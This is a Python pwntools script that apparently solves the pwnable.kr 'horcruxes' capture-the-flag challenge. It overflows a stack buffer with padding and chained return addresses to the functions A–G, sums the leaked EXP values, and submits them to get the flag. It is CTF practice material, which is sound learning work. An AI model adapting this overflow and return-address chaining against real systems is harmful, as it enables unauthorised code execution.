#!/usr/bin/env python
# coding=utf-8
# author: thinkycx
# date: 2018-11-23
from pwn import *
context.local(arch='i386', os='linux')

def getHorcruxes():
    payload = 0x78*'a' + p32(elf.symbols['A']) + p32(elf.symbols['B']) + \
            p32(elf.symbols['C']) + p32(elf.symbols['D']) + p32(elf.symbols['E']) + \
            p32(elf.symbols['F']) + p32(elf.symbols['G']) + p32(0x0809FFFC)  # input sum   #p32(0x080a010e)
    io.sendlineafter("How many EXP did you earned? :", payload)

'''
You'd better get more experience to kill Voldemort
You found "Tom Riddle's Diary" (EXP +599891636)
You found "Marvolo Gaunt's Ring" (EXP +939030488)
You found "Helga Hufflepuff's Cup" (EXP +294181247)
You found "Salazar Slytherin's Locket" (EXP +822808447)
You found "Rowena Ravenclaw's Diadem" (EXP +1180943213)
You found "Nagini the Snake" (EXP +113031543)
You found "Harry Potter" (EXP +160863879)
'''

def getSum():
    sum = 0 
    for i in range(7):
        io.recvuntil("EXP +")
        sum += int(io.recvuntil(")").replace(")", ""), 10)
    return sum

def pwn():
    if debug&local: gdb.attach(io)
    io.sendlineafter("Select Menu:", "0")
    getHorcruxes()
    sum = getSum() 
    log.info("raw sum: 0x%x" % sum)
    if sum >= pow(2,31):
        log.warn("sum >= 2^31, atoi will retun -1, try again")
        exit(0)
    elif sum < -pow(2,31):
        log.warn("sum < -2^31, atoi will return -1, try again")
        exit(0)
    io.sendlineafter("Select Menu:", "0")
    io.sendlineafter("How many EXP did you earned? ", unicode(sum)) # atoi change str to number
    log.success("flag: " + io.recv()) 
    
if __name__ == '__main__':
    global io, elf, libc, debug
    local, debug = 0, 0
    # context.log_level = 'debug'
    filename = './horcruxes'
    elf = ELF(filename)
    if local:
        io = process(filename)
        context.terminal = ['tmux', 'splitw', '-h' ]
    else:
        con = ssh(host='pwnable.kr', user='horcruxes', password='guest', port=2222)
        io = con.connect_remote('localhost', 9032)
    pwn()
    io.interactive()
